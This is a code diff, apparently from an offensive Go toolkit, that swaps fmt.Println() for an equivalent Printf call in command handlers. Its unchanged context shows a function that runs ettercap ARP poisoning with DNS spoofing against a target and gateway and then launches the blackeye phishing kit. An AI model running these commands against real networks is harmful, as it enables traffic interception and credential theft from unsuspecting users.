@@ -228,9 +228,9 @@ func handleSetCommand(parts []string) {
             for j := 0; j < cols && i+j < len(suggestions); j++ {
                 fmt.Printf(" -> %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
             }
-            fmt.Println()
+            fmt.Printf("%s", "\n")
         }
-        fmt.Println()
+        fmt.Printf("%s", "\n")
         return
     }
 
@@ -248,7 +248,7 @@ func handleSetCommand(parts []string) {
         for j := 0; j < cols && i+j < len(validKeys); j++ {
             fmt.Printf(" -> %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
         }
-        fmt.Println()
+        fmt.Printf("%s", "\n")
     }
 }
 
@@ -342,9 +342,9 @@ func handleUnsetCommand(parts []string) {
             for j := 0; j < cols && i+j < len(suggestions); j++ {
                 fmt.Printf(" -> %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
             }
-            fmt.Println()
+            fmt.Printf("%s", "\n")
         }
-        fmt.Println()
+        fmt.Printf("%s", "\n")
         return
     }
 
@@ -363,7 +363,7 @@ func handleUnsetCommand(parts []string) {
         for j := 0; j < cols && i+j < len(validKeys); j++ {
             fmt.Printf(" - %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
         }
-        fmt.Println()
+        fmt.Printf("%s", "\n")
     }
 }
 
@@ -545,7 +545,7 @@ func NinjaEttercap(LHost, GateWay, PhFakeDns, RHost, IFace, Target string) {
         }
         subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, IFace, utils.RHost, GateWay)
         subprocess.Run(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
-        fmt.Println()
+        fmt.Printf("%s", "\n")
         subprocess.Run(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
         return
 
@@ -578,10 +578,10 @@ func NinjaEttercap(LHost, GateWay, PhFakeDns, RHost, IFace, Target string) {
         utils.Editors(filesToReplacements)
         }
 
-        fmt.Println()
+        fmt.Printf("%s", "\n")
         subprocess.Run(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &`, IFace)
         subprocess.Run(`cd %s/blackeye; bash ./blackeye.sh`, utils.PhishersTools)
-        fmt.Println()
+        fmt.Printf("%s", "\n")
         subprocess.Run(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
         return
 
@@ -589,7 +589,7 @@ func NinjaEttercap(LHost, GateWay, PhFakeDns, RHost, IFace, Target string) {
         fmt.Printf("\n%s[!] %sInvalid parameter TARGET. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Println()
+    fmt.Printf("%s", "\n")
 }
 
 func NinjaBettercap(LHost, GateWay, PhFakeDns, RHost, IFace, Target string) {
